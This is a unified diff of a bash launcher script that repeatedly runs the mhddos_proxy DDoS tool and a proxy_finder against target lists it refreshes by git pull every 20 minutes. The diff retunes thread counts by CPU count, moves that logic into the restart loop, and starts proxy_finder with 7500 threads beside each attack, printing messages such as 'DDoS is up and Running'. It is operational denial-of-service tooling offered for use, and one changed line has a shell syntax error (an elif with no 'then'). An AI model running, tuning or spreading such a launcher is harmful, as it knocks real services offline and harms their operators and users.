@@ -75,78 +75,80 @@ then
 	vpn="--vpn"
 fi
 
-rand=3
 
-proc_num=$(nproc --all)
-if ((proc_num < 2));
-then
-	if ((threads > 2000));
-	then
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for 1 CPU - attack will be started with 2000 threads\033[0;0m\n"
-		threads=2000
-	fi
-	
-	
-	rand=$(shuf -i 1-2 -n 1)
-	if ((rand == 1));
-	then
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
-	else
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
-	fi
-	
-	if ((rand == 2));
-	then
-		if ((num_of_copies > 1));
-		then 
-			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so attack will be started only with 1 parallel attack\033[0;0m\n"
-			num_of_copies=1
-		fi
-	fi
-	
-elif ((proc_num >= 2 && proc_num < 4));
-then
-
-	if ((threads > 5000));
-	then
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for $proc_num CPUs - attack will be started with 5000 threads\033[0;0m\n"
-		threads=5000
-	fi
-	
-	
-	rand=$(shuf -i 1-2 -n 1)
-	if ((rand == 1));
-	then
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
-	else
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
-	fi
-	
-	if ((rand == 2));
-	then
-		if ((num_of_copies > 1));
-		then 
-			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so attack will be started only with 1 parallel attack\033[0;0m\n"
-			num_of_copies=1
-		fi
-	fi
-	
-elif ((proc_num > 4));
-then
-	if ((threads < 3000));
-	then
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads for $proc_num CPUs - attack will be started with 3000 async threads\033[0;0m\n"
-		threads=3000
-	fi
-
-fi
-
-sleep 5s
 
 
 # Restart attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
 do	
+	rand=3
+
+	proc_num=$(nproc --all)
+	if ((proc_num < 2));
+	then
+		if ((threads > 1500));
+		then
+			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for 1 CPU - attack will be started with 1500 threads\033[0;0m\n"
+			threads=1500
+		fi
+		rand=$(shuf -i 1-2 -n 1)
+		if ((rand == 1));
+		then
+			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
+		else
+			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
+		fi
+	
+		if ((rand == 2));
+		then
+			if ((num_of_copies > 1));
+			then 
+				echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so attack will be started only with 1 parallel attack\033[0;0m\n"
+				num_of_copies=1
+			fi
+		fi
+	
+	elif ((proc_num >= 2 && proc_num <= 4));
+	then
+		if ((threads > 10000));
+		then
+			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for $proc_num CPUs - attack will be started with 10000 threads\033[0;0m\n"
+			threads=10000
+		elif ((threads < 3000));
+			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads for $proc_num CPUs - attack will be started with 3000 threads\033[0;0m\n"
+			threads=3000
+		fi
+	
+	
+		rand=$(shuf -i 1-2 -n 1)
+		if ((rand == 1));
+		then
+			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
+		else
+			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
+		fi
+	
+		if ((rand == 2));
+		then
+			if ((num_of_copies > 1));
+			then 
+				echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so attack will be started only with 1 parallel attack\033[0;0m\n"
+				num_of_copies=1
+			fi
+		fi
+
+	elif ((proc_num > 4));
+	then
+		if ((threads < 4000));
+		then
+			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads for $proc_num CPUs - attack will be started with 4000 async threads\033[0;0m\n"
+			threads=4000
+		fi
+
+	fi
+
+
+	sleep 5s
 	cd ~/mhddos_proxy
 
 	num0=$(git pull origin main | grep -E -c 'Already|Уже|Вже')
@@ -229,6 +231,7 @@ do
             		python runner.py $cmd_line -t $threads $vpn --lang en $debug&
 	    		sleep 20s
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
+			
    		done
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be going only mhddos_proxy (without proxy_finder)\033[0;0m\n"
    		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
@@ -265,19 +268,21 @@ do
             		python runner.py $cmd_line -t $threads $vpn $debug&
 	    		sleep 20s
 			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
+			
+			echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
+			sleep 2s
+			cd ~/proxy_finder
+			python finder.py --threads 7500&
 		done
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
 		sleep 5s
-		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
-		sleep 2s
-		cd ~/proxy_finder
-		python finder.py&
+		
 	else
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
 		sleep 3s
 		cd ~/proxy_finder
-		python finder.py --threads 8500&
+		python finder.py --threads 7500&
 	fi
 	
    	sleep $restart_interval
